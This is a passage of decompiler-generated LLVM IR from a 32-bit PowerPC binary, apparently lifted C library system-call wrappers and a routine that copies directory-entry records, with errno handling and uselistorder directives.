  %v0_10009d90 = phi i32 [ %v0_10009d28, %dec_label_pc_10009d14 ], [ %v0_10009d90.pre.pre, %dec_label_pc_10009d7c.dec_label_pc_10009d8c.loopexit_crit_edge ], [ %v0_10009d28, %dec_label_pc_10009d34 ]
  ret i32 %v0_10009d90

; uselistorder directives
  uselistorder i32 %v2_10009d78, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v0_10009d64, { 1, 0, 2 }
  uselistorder i32 %v1_10009d4c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10009d34, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_10009d28, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_10008564, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 11, { 0, 31, 30, 2, 8, 9, 16, 10, 11, 17, 12, 13, 18, 19, 1, 20, 14, 21, 22, 23, 24, 25, 3, 26, 27, 4, 28, 29, 15, 5, 6, 32, 33, 34, 35, 36, 37, 7 }
  uselistorder label %dec_label_pc_10009d8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009d3c, { 1, 0 }
}

define i32 @function_10009da4() local_unnamed_addr {
dec_label_pc_10009da4:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009da8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009da8, i32* %stack_var_-48, align 4
  %v5_10009da8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v4_10009da8, i32* %r9.global-to-local, align 4
  %v0_10009db4 = load i32, i32* @r5, align 4
  %v1_10009db4 = add i32 %v0_10009db4, 30
  %v1_10009db8 = call i32 @__asm_rlwinm(i32 %v1_10009db4, i32 0, i32 0, i32 27)
  store i32 %v5_10009da8, i32* @r31, align 4
  %v1_10009dc8 = load i32, i32* @r1, align 4
  %v3_10009dc8 = sub i32 %v1_10009dc8, %v1_10009db8
  %v4_10009dc8 = inttoptr i32 %v3_10009dc8 to i32*
  store i32 %v4_10009da8, i32* %v4_10009dc8, align 4
  %v0_10009dcc = load i32, i32* @r4, align 4
  store i32 %v0_10009dcc, i32* @r28, align 4
  %v0_10009dd0 = load i32, i32* @r5, align 4
  store i32 %v0_10009dd0, i32* @r23, align 4
  %v0_10009dd4 = load i32, i32* @r3, align 4
  store i32 %v0_10009dd4, i32* @r22, align 4
  %v1_10009dd8 = add i32 %v3_10009dc8, 23
  %v1_10009ddc = call i32 @__asm_rlwinm(i32 %v1_10009dd8, i32 0, i32 0, i32 27)
  store i32 %v1_10009ddc, i32* @r27, align 4
  store i32 %v1_10009ddc, i32* %r4.global-to-local, align 4
  %v0_10009dec = call i32 @__asm_mfcr()
  %v1_10009df0 = and i32 %v0_10009dec, 268435456
  store i32 %v1_10009df0, i32* %r9.global-to-local, align 4
  %v3_10009df0 = icmp eq i32 %v1_10009df0, 0
  store i32 %v0_10009dec, i32* %r30.global-to-local, align 4
  br i1 %v3_10009df0, label %dec_label_pc_10009e08, label %dec_label_pc_10009dfc

dec_label_pc_10009dfc:                            ; preds = %dec_label_pc_10009da4
  %v0_10009dfc = call i32 @function_10008484()
  %v0_10009e00 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009e00 = inttoptr i32 %v0_10009dfc to i32*
  store i32 %v0_10009e00, i32* %v2_10009e00, align 4
  br label %dec_label_pc_10009e14

dec_label_pc_10009e08:                            ; preds = %dec_label_pc_10009da4
  %v3_10009e08 = icmp eq i32 %v0_10009dec, -1
  store i32 %v0_10009dec, i32* %r24.global-to-local, align 4
  br i1 %v3_10009e08, label %dec_label_pc_10009e14, label %dec_label_pc_10009e1c

dec_label_pc_10009e14:                            ; preds = %dec_label_pc_10009e08, %dec_label_pc_10009dfc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009ee0

dec_label_pc_10009e1c:                            ; preds = %dec_label_pc_10009e08
  %v0_10009e1c = load i32, i32* @r28, align 4
  store i32 %v0_10009e1c, i32* %r29.global-to-local, align 4
  store i32 %v1_10009ddc, i32* %r30.global-to-local, align 4
  store i32 -1, i32* @r25, align 4
  store i32 -1, i32* %r26.global-to-local, align 4
  %v2_10009ec412 = add i32 %v0_10009dec, %v1_10009ddc
  %v1_10009ec813 = load i32, i32* @r23, align 4
  %v2_10009ec814 = add i32 %v1_10009ec813, %v0_10009e1c
  store i32 %v2_10009ec814, i32* %r10.global-to-local, align 4
  %v2_10009ecc15 = icmp ult i32 %v1_10009ddc, %v2_10009ec412
  %v1_10009ed018 = add i32 %v0_10009e1c, 19
  store i32 %v1_10009ed018, i32* @r3, align 4
  %v1_10009ed419 = add i32 %v1_10009ddc, 19
  store i32 %v1_10009ed419, i32* @r4, align 4
  br i1 %v2_10009ecc15, label %dec_label_pc_10009e30, label %dec_label_pc_10009edc

dec_label_pc_10009e30:                            ; preds = %dec_label_pc_10009e1c, %dec_label_pc_10009e78
  %v0_10009e3020 = phi i32 [ %v2_10009ec0, %dec_label_pc_10009e78 ], [ %v1_10009ddc, %dec_label_pc_10009e1c ]
  %v1_10009e30 = add i32 %v0_10009e3020, 16
  %v2_10009e30 = inttoptr i32 %v1_10009e30 to i16*
  %v3_10009e30 = load i16, i16* %v2_10009e30, align 2
  %v4_10009e30 = zext i16 %v3_10009e30 to i32
  %v1_10009e34 = add nuw nsw i32 %v4_10009e30, 7
  store i32 %v1_10009e34, i32* %r9.global-to-local, align 4
  %v1_10009e38 = call i32 @__asm_rlwinm(i32 %v1_10009e34, i32 0, i32 0, i32 28)
  %v0_10009e3c = load i32, i32* %r29.global-to-local, align 4
  %v3_10009e3c = add i32 %v1_10009e38, %v0_10009e3c
  store i32 %v3_10009e3c, i32* %r11.global-to-local, align 4
  %v1_10009e40 = load i32, i32* %r10.global-to-local, align 4
  %v3_10009e40 = icmp ugt i32 %v3_10009e3c, %v1_10009e40
  br i1 %v3_10009e40, label %dec_label_pc_10009e48, label %dec_label_pc_10009e78

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009e30
  %v0_10009e48 = load i32, i32* @r22, align 4
  %v0_10009e4c = load i32, i32* @r25, align 4
  %v0_10009e50 = load i32, i32* %r26.global-to-local, align 4
  store i32 268475996, i32* @lr, align 4
  %v4_10009e58 = call i32 @function_1000a01c(i32 %v0_10009e48, i32 %v0_10009e4c, i32 %v0_10009e50, i32 0)
  %v0_10009e5c = load i32, i32* %r29.global-to-local, align 4
  %v1_10009e5c = load i32, i32* @r28, align 4
  %v4_10009e5c = icmp eq i32 %v0_10009e5c, %v1_10009e5c
  br i1 %v4_10009e5c, label %dec_label_pc_10009e64, label %dec_label_pc_10009edc

dec_label_pc_10009e64:                            ; preds = %dec_label_pc_10009e48
  %v0_10009e64 = call i32 @function_10008484()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10009e70 = inttoptr i32 %v0_10009e64 to i32*
  store i32 22, i32* %v2_10009e70, align 4
  %v0_10009ee4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009ee0

dec_label_pc_10009e78:                            ; preds = %dec_label_pc_10009e30
  %v2_10009e38 = trunc i32 %v1_10009e38 to i16
  %v0_10009e78 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009e78 = inttoptr i32 %v0_10009e78 to i32*
  %v2_10009e78 = load i32, i32* %v1_10009e78, align 4
  store i32 %v2_10009e78, i32* %r9.global-to-local, align 4
  %v1_10009e7c = add i32 %v0_10009e78, 4
  %v2_10009e7c = inttoptr i32 %v1_10009e7c to i32*
  %v3_10009e7c = load i32, i32* %v2_10009e7c, align 4
  store i32 %v3_10009e7c, i32* %r10.global-to-local, align 4
  %v1_10009e80 = add i32 %v0_10009e78, 8
  %v2_10009e80 = inttoptr i32 %v1_10009e80 to i32*
  %v3_10009e80 = load i32, i32* %v2_10009e80, align 4
  store i32 %v3_10009e80, i32* @r25, align 4
  %v1_10009e84 = add i32 %v0_10009e78, 12
  %v2_10009e84 = inttoptr i32 %v1_10009e84 to i32*
  %v3_10009e84 = load i32, i32* %v2_10009e84, align 4
  store i32 %v3_10009e84, i32* %r26.global-to-local, align 4
  %v2_10009e88 = inttoptr i32 %v0_10009e3c to i32*
  store i32 %v2_10009e78, i32* %v2_10009e88, align 4
  %v0_10009e8c = load i32, i32* %r10.global-to-local, align 4
  %v1_10009e8c = load i32, i32* %r29.global-to-local, align 4
  %v2_10009e8c = add i32 %v1_10009e8c, 4
  %v3_10009e8c = inttoptr i32 %v2_10009e8c to i32*
  store i32 %v0_10009e8c, i32* %v3_10009e8c, align 4
  %v0_10009e90 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009e90 = add i32 %v0_10009e90, 8
  %v2_10009e90 = inttoptr i32 %v1_10009e90 to i32*
  %v3_10009e90 = load i32, i32* %v2_10009e90, align 4
  store i32 %v3_10009e90, i32* %r9.global-to-local, align 4
  %v1_10009e94 = add i32 %v0_10009e90, 12
  %v2_10009e94 = inttoptr i32 %v1_10009e94 to i32*
  %v3_10009e94 = load i32, i32* %v2_10009e94, align 4
  store i32 %v3_10009e94, i32* %r10.global-to-local, align 4
  %v3_10009e98 = load i32, i32* %r29.global-to-local, align 4
  %v4_10009e98 = add i32 %v3_10009e98, 16
  %v5_10009e98 = inttoptr i32 %v4_10009e98 to i16*
  store i16 %v2_10009e38, i16* %v5_10009e98, align 2
  %v0_10009e9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10009e9c = load i32, i32* %r29.global-to-local, align 4
  %v2_10009e9c = add i32 %v1_10009e9c, 8
  %v3_10009e9c = inttoptr i32 %v2_10009e9c to i32*
  store i32 %v0_10009e9c, i32* %v3_10009e9c, align 4
  %v0_10009ea0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009ea0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10009ea0 = add i32 %v1_10009ea0, 12
  %v3_10009ea0 = inttoptr i32 %v2_10009ea0 to i32*
  store i32 %v0_10009ea0, i32* %v3_10009ea0, align 4
  %v0_10009ea4 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009ea4 = add i32 %v0_10009ea4, 18
  %v2_10009ea4 = inttoptr i32 %v1_10009ea4 to i8*
  %v3_10009ea4 = load i8, i8* %v2_10009ea4, align 1
  %v2_10009ea8 = load i32, i32* %r29.global-to-local, align 4
  %v3_10009ea8 = add i32 %v2_10009ea8, 18
  %v4_10009ea8 = inttoptr i32 %v3_10009ea8 to i8*
  store i8 %v3_10009ea4, i8* %v4_10009ea8, align 1
  %v0_10009eac = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10009eac, i32* %r29.global-to-local, align 4
  %v0_10009eb0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009eb0 = add i32 %v0_10009eb0, 16
  %v2_10009eb0 = inttoptr i32 %v1_10009eb0 to i16*
  %v3_10009eb0 = load i16, i16* %v2_10009eb0, align 2
  %v4_10009eb0 = zext i16 %v3_10009eb0 to i32
  %v1_10009eb4 = add nsw i32 %v4_10009eb0, -19
  store i32 %v1_10009eb4, i32* @r5, align 4
  store i32 268476092, i32* @lr, align 4
  %v0_10009eb8 = call i32 @function_100084c8()
  %v0_10009ebc = load i32, i32* %r30.global-to-local, align 4
  %v1_10009ebc = add i32 %v0_10009ebc, 16
  %v2_10009ebc = inttoptr i32 %v1_10009ebc to i16*
  %v3_10009ebc = load i16, i16* %v2_10009ebc, align 2
  %v4_10009ebc = zext i16 %v3_10009ebc to i32
  %v2_10009ec0 = add i32 %v4_10009ebc, %v0_10009ebc
  store i32 %v2_10009ec0, i32* %r30.global-to-local, align 4
  %v1_10009ec4.pre = load i32, i32* %r24.global-to-local, align 4
  %v0_10009ec8.pre = load i32, i32* @r28, align 4
  %v0_10009ed0.pre = load i32, i32* %r29.global-to-local, align 4
  %v2_10009ec4 = add i32 %v1_10009ec4.pre, %v1_10009ddc
  %v1_10009ec8 = load i32, i32* @r23, align 4
  %v2_10009ec8 = add i32 %v1_10009ec8, %v0_10009ec8.pre
  store i32 %v2_10009ec8, i32* %r10.global-to-local, align 4
  %v2_10009ecc = icmp ult i32 %v2_10009ec0, %v2_10009ec4
  %v1_10009ed0 = add i32 %v0_10009ed0.pre, 19
  store i32 %v1_10009ed0, i32* @r3, align 4
  %v1_10009ed4 = add i32 %v2_10009ec0, 19
  store i32 %v1_10009ed4, i32* @r4, align 4
  br i1 %v2_10009ecc, label %dec_label_pc_10009e30, label %dec_label_pc_10009edc

dec_label_pc_10009edc:                            ; preds = %dec_label_pc_10009e1c, %dec_label_pc_10009e78, %dec_label_pc_10009e48
  %v1_10009edc = phi i32 [ %v0_10009e5c, %dec_label_pc_10009e48 ], [ %v0_10009e1c, %dec_label_pc_10009e1c ], [ %v0_10009ed0.pre, %dec_label_pc_10009e78 ]
  %v0_10009edc = phi i32 [ %v1_10009e5c, %dec_label_pc_10009e48 ], [ %v0_10009e1c, %dec_label_pc_10009e1c ], [ %v0_10009ec8.pre, %dec_label_pc_10009e78 ]
  %v2_10009edc = sub i32 %v1_10009edc, %v0_10009edc
  store i32 %v2_10009edc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009ee0

dec_label_pc_10009ee0:                            ; preds = %dec_label_pc_10009e64, %dec_label_pc_10009e14, %dec_label_pc_10009edc
  %v0_10009ee4 = phi i32 [ %v0_10009ee4.pre, %dec_label_pc_10009e64 ], [ -1, %dec_label_pc_10009e14 ], [ %v2_10009edc, %dec_label_pc_10009edc ]
  %v0_10009ee0 = load i32, i32* @r1, align 4
  %v1_10009ee0 = inttoptr i32 %v0_10009ee0 to i32*
  %v2_10009ee0 = load i32, i32* %v1_10009ee0, align 4
  store i32 %v2_10009ee0, i32* %r11.global-to-local, align 4
  ret i32 %v0_10009ee4

; uselistorder directives
  uselistorder i32 %v2_10009ec0, { 2, 1, 3, 0 }
  uselistorder i32 %v0_10009e78, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10009e38, { 1, 0 }
  uselistorder i32 %v0_10009dec, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_10009ddc, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 18, { 6, 7, 8, 2, 3, 4, 5, 9, 10, 0, 11, 1, 12 }
  uselistorder i32 22, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32 7, { 37, 47, 9, 10, 31, 11, 12, 32, 13, 14, 33, 15, 16, 34, 35, 1, 17, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0, 27, 38, 2, 39, 3, 40, 4, 41, 5, 42, 28, 43, 44, 6, 45, 46, 7, 48, 29, 49, 30, 50, 51, 8 }
  uselistorder i32 19, { 16, 17, 1, 2, 0, 13, 14, 15, 3, 6, 7, 10, 8, 9, 11, 12, 18, 19, 20, 4, 5 }
  uselistorder i32* @r25, { 11, 12, 13, 2, 4, 5, 3, 6, 7, 8, 9, 0, 10, 14, 15, 16, 17, 1, 18, 19, 20 }
  uselistorder i32* @r27, { 22, 16, 17, 35, 36, 3, 4, 5, 0, 6, 7, 8, 9, 10, 1, 11, 12, 13, 14, 15, 20, 18, 19, 2, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 23, { 5, 4, 6, 0, 1, 3, 2 }
  uselistorder i32* @r22, { 2, 3, 0, 1, 4 }
  uselistorder i32* @r23, { 10, 0, 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* @r1, { 9, 10, 2, 3, 6, 7, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 4, 36, 5, 37, 28, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0, 68, 1, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 15, 16, 17, 31, 18, 20, 19, 21, 0, 33, 32, 1, 2, 3, 22, 23, 24, 25, 14, 4, 5, 6, 7, 9, 10, 8, 11, 12, 13, 26, 27, 29, 28, 30, 34 }
  uselistorder i32 27, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10009ee0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009edc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009e30, { 1, 0 }
}

define i32 @function_10009efc() local_unnamed_addr {
dec_label_pc_10009efc:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009f14 = call i32 @__asm_mfcr()
  %v1_10009f18 = and i32 %v0_10009f14, 268435456
  %v3_10009f18 = icmp eq i32 %v1_10009f18, 0
  store i32 %v0_10009f14, i32* %r31.global-to-local, align 4
  br i1 %v3_10009f18, label %dec_label_pc_10009f30, label %dec_label_pc_10009f24

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009efc
  %v0_10009f24 = call i32 @function_10008484()
  %v0_10009f28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009f28 = inttoptr i32 %v0_10009f24 to i32*
  store i32 %v0_10009f28, i32* %v2_10009f28, align 4
  br label %dec_label_pc_10009f30

dec_label_pc_10009f30:                            ; preds = %dec_label_pc_10009efc, %dec_label_pc_10009f24
  %v0_10009f40 = phi i32 [ %v0_10009f14, %dec_label_pc_10009efc ], [ -1, %dec_label_pc_10009f24 ]
  ret i32 %v0_10009f40

; uselistorder directives
  uselistorder label %dec_label_pc_10009f30, { 1, 0 }
}

define i32 @function_10009f44() local_unnamed_addr {
dec_label_pc_10009f44:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009f5c = call i32 @__asm_mfcr()
  %v1_10009f60 = and i32 %v0_10009f5c, 268435456
  %v3_10009f60 = icmp eq i32 %v1_10009f60, 0
  store i32 %v0_10009f5c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009f60, label %dec_label_pc_10009f78, label %dec_label_pc_10009f6c

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f44
  %v0_10009f6c = call i32 @function_10008484()
  %v0_10009f70 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009f70 = inttoptr i32 %v0_10009f6c to i32*
  store i32 %v0_10009f70, i32* %v2_10009f70, align 4
  br label %dec_label_pc_10009f78

dec_label_pc_10009f78:                            ; preds = %dec_label_pc_10009f44, %dec_label_pc_10009f6c
  %v0_10009f88 = phi i32 [ %v0_10009f5c, %dec_label_pc_10009f44 ], [ -1, %dec_label_pc_10009f6c ]
  ret i32 %v0_10009f88

; uselistorder directives
  uselistorder label %dec_label_pc_10009f78, { 1, 0 }
}

define i32 @function_10009f8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009f8c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009fa4 = call i32 @__asm_mfcr()
  %v1_10009fa8 = and i32 %v0_10009fa4, 268435456
  %v3_10009fa8 = icmp eq i32 %v1_10009fa8, 0
  store i32 %v0_10009fa4, i32* %r31.global-to-local, align 4
  br i1 %v3_10009fa8, label %dec_label_pc_10009fc0, label %dec_label_pc_10009fb4

dec_label_pc_10009fb4:                            ; preds = %dec_label_pc_10009f8c
  %v0_10009fb4 = call i32 @function_10008484()
  %v0_10009fb8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009fb8 = inttoptr i32 %v0_10009fb4 to i32*
  store i32 %v0_10009fb8, i32* %v2_10009fb8, align 4
  br label %dec_label_pc_10009fc0

dec_label_pc_10009fc0:                            ; preds = %dec_label_pc_10009f8c, %dec_label_pc_10009fb4
  %v0_10009fd0 = phi i32 [ %v0_10009fa4, %dec_label_pc_10009f8c ], [ -1, %dec_label_pc_10009fb4 ]
  ret i32 %v0_10009fd0

; uselistorder directives
  uselistorder label %dec_label_pc_10009fc0, { 1, 0 }
}

define i32 @function_10009fd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009fd4:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009fec = call i32 @__asm_mfcr()
  %v1_10009ff0 = and i32 %v0_10009fec, 268435456
  %v3_10009ff0 = icmp eq i32 %v1_10009ff0, 0
  store i32 %v0_10009fec, i32* %r31.global-to-local, align 4
  br i1 %v3_10009ff0, label %dec_label_pc_1000a008, label %dec_label_pc_10009ffc

dec_label_pc_10009ffc:                            ; preds = %dec_label_pc_10009fd4
  %v0_10009ffc = call i32 @function_10008484()
  %v0_1000a000 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a000 = inttoptr i32 %v0_10009ffc to i32*
  store i32 %v0_1000a000, i32* %v2_1000a000, align 4
  br label %dec_label_pc_1000a008

dec_label_pc_1000a008:                            ; preds = %dec_label_pc_10009fd4, %dec_label_pc_10009ffc
  %v0_1000a018 = phi i32 [ %v0_10009fec, %dec_label_pc_10009fd4 ], [ -1, %dec_label_pc_10009ffc ]
  ret i32 %v0_1000a018

; uselistorder directives
  uselistorder label %dec_label_pc_1000a008, { 1, 0 }
}

define i32 @function_1000a01c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000a01c:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000a01c = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000a048 = call i32 @__asm_mfcr()
  %v1_1000a04c = and i32 %v0_1000a048, 268435456
  %v3_1000a04c = icmp eq i32 %v1_1000a04c, 0
  store i32 %v0_1000a048, i32* %r31.global-to-local, align 4
  store i32 %v0_1000a048, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a04c, label %dec_label_pc_1000a070, label %dec_label_pc_1000a060

dec_label_pc_1000a060:                            ; preds = %dec_label_pc_1000a01c
  %v0_1000a060 = call i32 @function_10008484()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000a068 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a068 = inttoptr i32 %v0_1000a060 to i32*
  store i32 %v0_1000a068, i32* %v2_1000a068, align 4
  %v0_1000a074.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a074

dec_label_pc_1000a070:                            ; preds = %dec_label_pc_1000a01c
  %v3_1000a058 = icmp eq i32 %v0_1000a048, 0
  br i1 %v3_1000a058, label %dec_label_pc_1000a080, label %dec_label_pc_1000a074

dec_label_pc_1000a074:                            ; preds = %dec_label_pc_1000a070, %dec_label_pc_1000a060
  %v0_1000a074 = phi i32 [ %v0_1000a048, %dec_label_pc_1000a070 ], [ %v0_1000a074.pre, %dec_label_pc_1000a060 ]
  %tmp = icmp slt i32 %v0_1000a074, 0
  %v1_1000a078 = zext i1 %tmp to i32
  %v2_1000a078 = ashr i32 %v0_1000a074, 31
  %v3_1000a078 = and i32 %v2_1000a078, -2
  %v4_1000a078 = or i32 %v3_1000a078, %v1_1000a078
  br label %dec_label_pc_1000a088

dec_label_pc_1000a080:                            ; preds = %dec_label_pc_1000a070
  %v3_1000a080 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a088

dec_label_pc_1000a088:                            ; preds = %dec_label_pc_1000a074, %dec_label_pc_1000a080
  %v0_1000a098 = phi i32 [ %v4_1000a078, %dec_label_pc_1000a074 ], [ %v3_1000a080, %dec_label_pc_1000a080 ]
  store i32 %v0_1000a01c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a098

; uselistorder directives
  uselistorder i32 %v0_1000a074, { 1, 0 }
  uselistorder i32 %v0_1000a048, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 7, 6, 1, 0, 8, 9, 10, 2, 11, 3, 12, 4, 5, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_1000a088, { 1, 0 }
}

define i32 @function_1000a09c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a09c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a0b4 = call i32 @__asm_mfcr()
  %v1_1000a0b8 = and i32 %v0_1000a0b4, 268435456
  %v3_1000a0b8 = icmp eq i32 %v1_1000a0b8, 0
  store i32 %v0_1000a0b4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a0b8, label %dec_label_pc_1000a0d0, label %dec_label_pc_1000a0c4

dec_label_pc_1000a0c4:                            ; preds = %dec_label_pc_1000a09c
  %v0_1000a0c4 = call i32 @function_10008484()
  %v0_1000a0c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a0c8 = inttoptr i32 %v0_1000a0c4 to i32*
  store i32 %v0_1000a0c8, i32* %v2_1000a0c8, align 4
  br label %dec_label_pc_1000a0d0

dec_label_pc_1000a0d0:                            ; preds = %dec_label_pc_1000a09c, %dec_label_pc_1000a0c4
  %v0_1000a0e0 = phi i32 [ %v0_1000a0b4, %dec_label_pc_1000a09c ], [ -1, %dec_label_pc_1000a0c4 ]
  ret i32 %v0_1000a0e0

; uselistorder directives
  uselistorder label %dec_label_pc_1000a0d0, { 1, 0 }
}

define i32 @function_1000a0e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a0e4:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000a100 = load i32, i32* @global_var_1001b2d4.400, align 4
  %v3_1000a104 = icmp eq i32 %v3_1000a100, 0
  br i1 %v3_1000a104, label %dec_label_pc_1000a10c, label %dec_label_pc_1000a118

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a0e4
  store i32 268476688, i32* @lr, align 4
  %v1_1000a10c = call i32 @function_1000a63c(i32 0)
  %v1_1000a110 = icmp slt i32 %v1_1000a10c, 0
  br i1 %v1_1000a110, label %dec_label_pc_1000a138, label %dec_label_pc_1000a10c.dec_label_pc_1000a118_crit_edge

dec_label_pc_1000a10c.dec_label_pc_1000a118_crit_edge: ; preds = %dec_label_pc_1000a10c
  %v0_1000a118.pre = load i32, i32* @r30, align 4
  %v3_1000a11c.pre = load i32, i32* @global_var_1001b2d4.400, align 4
  br label %dec_label_pc_1000a118

dec_label_pc_1000a118:                            ; preds = %dec_label_pc_1000a10c.dec_label_pc_1000a118_crit_edge, %dec_label_pc_1000a0e4
  %v3_1000a11c = phi i32 [ %v3_1000a11c.pre, %dec_label_pc_1000a10c.dec_label_pc_1000a118_crit_edge ], [ %v3_1000a100, %dec_label_pc_1000a0e4 ]
  %v1_1000a124 = phi i32 [ %v0_1000a118.pre, %dec_label_pc_1000a10c.dec_label_pc_1000a118_crit_edge ], [ %arg1, %dec_label_pc_1000a0e4 ]
  %v3_1000a118 = icmp eq i32 %v1_1000a124, 0
  store i32 %v3_1000a11c, i32* @r31, align 4
  br i1 %v3_1000a118, label %dec_label_pc_1000a13c, label %dec_label_pc_1000a12c

dec_label_pc_1000a12c:                            ; preds = %dec_label_pc_1000a118
  %v2_1000a124 = add i32 %v1_1000a124, %v3_1000a11c
  store i32 268476720, i32* @lr, align 4
  %v1_1000a12c = call i32 @function_1000a63c(i32 %v2_1000a124)
  %tmp6 = icmp sgt i32 %v1_1000a12c, -1
  br i1 %tmp6, label %dec_label_pc_1000a12c.dec_label_pc_1000a13c_crit_edge, label %dec_label_pc_1000a138

dec_label_pc_1000a12c.dec_label_pc_1000a13c_crit_edge: ; preds = %dec_label_pc_1000a12c
  %v0_1000a140.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a13c

dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a12c, %dec_label_pc_1000a10c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000a13c

dec_label_pc_1000a13c:                            ; preds = %dec_label_pc_1000a12c.dec_label_pc_1000a13c_crit_edge, %dec_label_pc_1000a118, %dec_label_pc_1000a138
  %v0_1000a140 = phi i32 [ %v0_1000a140.pre, %dec_label_pc_1000a12c.dec_label_pc_1000a13c_crit_edge ], [ %v3_1000a11c, %dec_label_pc_1000a118 ], [ -1, %dec_label_pc_1000a138 ]
  ret i32 %v0_1000a140

; uselistorder directives
  uselistorder i32 %v3_1000a11c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000a63c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a13c, { 2, 0, 1 }
}

define i32 @function_1000a154(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a154:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a16c = call i32 @__asm_mfcr()
  %v1_1000a170 = and i32 %v0_1000a16c, 268435456
  %v3_1000a170 = icmp eq i32 %v1_1000a170, 0
  store i32 %v0_1000a16c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000a170, label %dec_label_pc_1000a188, label %dec_label_pc_1000a17c

dec_label_pc_1000a17c:                            ; preds = %dec_label_pc_1000a154
